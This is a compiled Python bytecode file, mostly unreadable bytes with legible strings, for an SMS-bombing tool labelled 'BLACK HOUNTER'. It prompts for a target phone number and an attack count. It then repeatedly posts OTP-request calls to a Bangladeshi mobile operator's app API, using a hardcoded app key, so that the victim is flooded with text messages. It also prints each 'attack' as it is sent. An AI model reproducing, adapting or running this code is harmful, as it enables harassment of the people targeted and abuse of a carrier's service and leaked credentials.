o
    ���b�	  �                   @   s�  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeee	d e
 ��Zeee	d e ��Ze �d� eed � e�d�Zee	d � ee	d � eed e	 d e d � e�d� ee	de�� d � ee	d e � ee	d ee� � eed � ee
d � d dlZd dlZd dlZd dlZd dlZd dlmZ d dlZd dlZd dlmZ d dlZej�� Zee	dej� d e�ed! �� d"ej � d#e�e
d$ �� � � ed%e�d&�� d'e�ed( �� d'e�ed) �� d*e�e	d+ �� �� d,Z!e� Z"d-e"d.< d/e"d0< d1e"d2< d3e Z#e$e�D ]8Z%z*ej&e!e"e#d4�Ze�d5� eee%d6 g�e ej' e d7 e	 e e
 d8 � W �q3   eed9 � Y �q3e �d� dS ):�    N�clearzlolcat ban.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   g{�G�z�?)�sys�stdout�write�flush�time�sleep)ZJonYZword� r
   �02.py�	logoprint   s
   
�r   z    Enter Target Number: z    Enter Attack Amount: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : BLACK HOUNTERz	 VERSION 	  : 2.2u   	 ♥♥z	 BLACK HOUNTER�   z	 Your IP Addreds:- Zipz	 Your Target Number: +88z	 Your amount: z3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictzDate : z - z%B�-z, z%AzTime: z%I�:z%Mz%S� z%pz4https://circle.robi.com.bd/mylife/appapi/appcall.phpZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kgz	x-app-key�gzipz
User-Agentz!application/x-www-form-urlencodedzContent-Typez,op=getOTC&pin=21799&app_version=78&msisdn=88)�headers�datag�������?�   z 
tAttack Number z& BLACK HOUNTER SiiR PiiN SenT HoYecHe
z'
[~] Make Sure Your Internet Connection)(�os�system�printZasyncior   Zrequestsr   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�inputZnumber�int�amount�getZresponser	   ZjsonZrequests.structuresr   ZdatetimeZnow�xZday�strftimeZyearZurlr   r   �range�iZpost�textr
   r
   r
   r   �<module>   sp    





<D
: